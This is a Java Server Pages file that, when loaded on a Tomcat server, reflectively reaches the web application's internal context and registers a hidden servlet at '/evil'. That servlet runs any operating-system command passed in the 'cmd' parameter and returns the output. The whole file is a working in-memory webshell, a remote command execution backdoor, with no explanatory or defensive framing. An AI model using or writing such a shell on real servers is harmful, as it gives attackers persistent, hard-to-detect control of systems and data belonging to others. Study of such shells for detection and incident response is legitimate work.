<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.*" %>
<% 
    class MyServlet extends HttpServlet{
        @Override
        protected void service(HttpServletRequest req,HttpServletResponse res) throws IOException, ServletException{
            String cmd=req.getParameter("cmd");
            if(cmd!=null&& cmd.isEmpty()==false){
                res.setContentType("text/html;charset=UTF-8");
                PrintWriter out=res.getWriter();
                try{
                    Process p=Runtime.getRuntime().exec(cmd);
                    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line=null;
                    while((line=br.readLine())!=null){
                        out.println(line);
                    }

                }catch(Exception e){
                    out.println(e.toString());
                }
                out.flush();
                return;
            }
        }
    }

    StandardContext sct=null;
    ClassLoader cl=Thread.currentThread().getContextClassLoader();
    Class<?> clazz=cl.getClass();
    Object resources=null;
    while(clazz!=null && resources==null){
        try{
            Field resourcesField=clazz.getDeclaredField("resources");
            resourcesField.setAccessible(true);
            resources=resourcesField.get(cl);

        
        }catch(NoSuchFieldException e){
            clazz=clazz.getSuperclass();
        }
    }
    if (resources==null){
        throw new Exception("找不到 resources 字段");
    }


    Class<?> resourcesClazz=resources.getClass();
    while(resourcesClazz!=null && sct==null){
        try{
            Field contextField=resourcesClazz.getDeclaredField("context");
            contextField.setAccessible(true);
            sct=(StandardContext)contextField.get(resources);
        }catch(NoSuchFieldException e){
            resourcesClazz=resourcesClazz.getSuperclass();
        }

    }
    if (sct==null){
        throw new Exception("找不到 context 字段");
    }


    try{
        MyServlet evilServlet=new MyServlet();
        String servletName="evilServlet"+System.currentTimeMillis();
    Wrapper wrapper=sct.createWrapper();
    wrapper.setName(servletName);
    wrapper.setServlet(evilServlet);
    wrapper.setServletClass(evilServlet.getClass().getName());

    sct.addChild(wrapper);
    sct.addServletMappingDecoded("/evil", servletName);
    out.println("Servlet inject succeeded, /evil?cmd=...");

    }catch(Exception e){
        e.printStackTrace(new PrintWriter(out));
    }
    
    
%>

